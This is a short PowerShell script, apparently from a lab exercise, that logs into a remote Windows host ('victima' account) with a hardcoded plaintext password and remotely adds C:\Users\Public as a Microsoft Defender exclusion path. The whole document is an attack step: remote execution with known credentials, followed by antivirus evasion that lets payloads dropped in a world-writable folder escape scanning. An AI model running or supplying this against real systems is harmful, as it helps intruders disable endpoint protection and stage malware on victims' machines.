$Target = "192.168.56.105";
$User = "victima";
$Pass = "pass1" | ConvertTo-SecureString -AsPlainText -Force;
$Cred = New-Object System.Management.Automation.PSCredential($User, $Pass);

Invoke-Command -ComputerName $Target -Credential $Cred -ScriptBlock {
    
    Add-MpPreference -ExclusionPath "C:\Users\Public" -Force;
    
}
